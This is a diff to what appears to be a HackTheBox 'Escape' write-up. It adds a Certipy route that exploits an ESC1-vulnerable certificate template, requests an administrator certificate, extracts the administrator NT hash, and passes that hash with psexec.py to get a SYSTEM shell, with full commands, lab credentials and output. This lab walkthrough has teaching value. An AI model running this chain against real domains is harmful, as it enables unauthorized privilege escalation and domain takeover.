@@ -810,7 +810,7 @@ Finally, we only need to run this `asktgt` command to request a `TGT` for the ad
 
 <br />
 
-It works! However, if we try to enter administrator folder and get the root.txt, we don't have permissions to do it.
+It works! However, if we try to enter administrator folder and get the root.txt flag, we don't have permissions to do it.
 
 To solve this, we can get the NTLM hash of the administrator user adding the following flags to our `asktgt` command:
 
@@ -839,7 +839,7 @@ To solve this, we can get the NTLM hash of the administrator user adding the fol
 
 <br />
 
-After doing this, we can use this NTLM hash to gain access as administrator using `Evil-WinRM`:
+After doing this, we can use this `NTLM` hash to gain access as administrator using `Evil-WinRM`:
 
 <br />
 
@@ -862,5 +862,163 @@ sequel\administrator
 <br />
 
 ## 2nd Option - Certipy:
+
+<br />
+
+Another way to exploit this vulnerability is by using [Certipy](https://github.com/ly4k/Certipy).
+
+This tool is also very powerful, and the main difference compared to `Certify.exe` is that `Certipy` can be used directly from our local Linux machine.
+
+We start detecting the vulnerable certificate template, such as `Certify.exe`:
+
+<br />
+
+```bash
+...[snip]...
+Certificate Templates
+  0
+    Template Name                       : UserAuthentication
+    Display Name                        : UserAuthentication
+    Certificate Authorities             : sequel-DC-CA
+    Enabled                             : True
+    Client Authentication               : True
+    Enrollment Agent                    : False
+    Any Purpose                         : False
+    Enrollee Supplies Subject           : True
+    Certificate Name Flag               : EnrolleeSuppliesSubject
+    Enrollment Flag                     : PublishToDs
+                                          IncludeSymmetricAlgorithms
+    Private Key Flag                    : ExportableKey
+    Extended Key Usage                  : Client Authentication
+                                          Secure Email
+                                          Encrypting File System
+    Requires Manager Approval           : False
+    Requires Key Archival               : False
+    Authorized Signatures Required      : 0
+    Validity Period                     : 10 years
+    Renewal Period                      : 6 weeks
+    Minimum RSA Key Length              : 2048
+    Permissions
+      Enrollment Permissions
+        Enrollment Rights               : SEQUEL.HTB\Domain Admins
+                                          SEQUEL.HTB\Domain Users
+                                          SEQUEL.HTB\Enterprise Admins
+      Object Control Permissions
+        Owner                           : SEQUEL.HTB\Administrator
+        Write Owner Principals          : SEQUEL.HTB\Domain Admins
+                                          SEQUEL.HTB\Enterprise Admins
+                                          SEQUEL.HTB\Administrator
+        Write Dacl Principals           : SEQUEL.HTB\Domain Admins
+                                          SEQUEL.HTB\Enterprise Admins
+                                          SEQUEL.HTB\Administrator
+        Write Property Principals       : SEQUEL.HTB\Domain Admins
+                                          SEQUEL.HTB\Enterprise Admins
+                                          SEQUEL.HTB\Administrator
+    [!] Vulnerabilities
+      ESC1                              : 'SEQUEL.HTB\\Domain Users' can enroll, enrollee supplies subject and template allows client authentication
+```
+
+<br />
+
+As we can see, the results are the same: 
+
+- Vulnerable Template -> `UserAuthentication`
+
+Next, we'll create the `.pfx` certificate with `req`:
+
+<br />
+
+```bash
+❯ certipy req -u 'Ryan.Cooper' -p 'NuclearMosquito3' -dc-ip '10.10.11.202' -target 'sequel.htb' -ca 'sequel-dc-ca' -template 'UserAuthentication' -upn 'administrator@sequel.htb'
+Certipy v4.8.2 - by Oliver Lyak (ly4k)
+
+[*] Requesting certificate via RPC
+[*] Successfully requested certificate
+[*] Request ID is 16
+[*] Got certificate with UPN 'administrator@sequel.htb'
+[*] Certificate has no object SID
+[*] Saved certificate and private key to 'administrator.pfx'
+```
+
+<br />
+
+Finally we only need to run the following `auth` command and get the hash:
+
+<br />
+
+```bash
+❯ certipy auth -pfx administrator.pfx
+Certipy v4.8.2 - by Oliver Lyak (ly4k)
+
+[*] Using principal: administrator@sequel.htb
+[*] Trying to get TGT...
+[-] Got error while trying to request TGT: Kerberos SessionError: KRB_AP_ERR_SKEW(Clock skew too great)
+```
+
+<br />
+
+Ops! We have an error!
+
+As we can see, the error says that there is a big time difference between our local machine and the Windows system.
+
+We can sync the clock with this command:
+
+<br />
+
+```bash
+❯ sudo ntpdate -u sequel.htb
+2025-05-04 21:13:26.432265 (+0200) +28693.754536 +/- 0.019893 sequel.htb 10.10.11.202 s1 no-leap
+CLOCK: time stepped by 28693.754536
+```
+
+<br />
+
+Finally, we run the `auth` command again:
+
+<br />
+
+```bash
+❯ certipy auth -pfx administrator.pfx
+Certipy v4.8.2 - by Oliver Lyak (ly4k)
+
+[*] Using principal: administrator@sequel.htb
+[*] Trying to get TGT...
+[*] Got TGT
+[*] Saved credential cache to 'administrator.ccache'
+[*] Trying to retrieve NT hash for 'administrator'
+[*] Got hash for 'administrator@sequel.htb': aad3b435b51404eeaad3b435b51404ee:a52f78e4c751e5f5e17e1e9f3e58f4ee
+```
+
+<br />
+
+Great! We have the hash!
+
+Using `psexec.py` we can connect to the system as `nt authority\system`:
+
+<br />
+
+```bash
+❯ psexec.py -hashes aad3b435b51404eeaad3b435b51404ee:a52f78e4c751e5f5e17e1e9f3e58f4ee administrator@10.10.11.202
+Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 
+
+[*] Requesting shares on 10.10.11.202.....
+[*] Found writable share ADMIN$
+[*] Uploading file HGYdPZeF.exe
+[*] Opening SVCManager on 10.10.11.202.....
+[*] Creating service LAKZ on 10.10.11.202.....
+[*] Starting service LAKZ.....
+[!] Press help for extra shell commands
+Microsoft Windows [Version 10.0.17763.2746]
+(c) 2018 Microsoft Corporation. All rights reserved.
+
+C:\Windows\system32> whoami
+nt authority\system
+```
+
+<br />
+
+Machine Escape pwned!
+
+Keep hacking!❤️❤️
 
 <br />
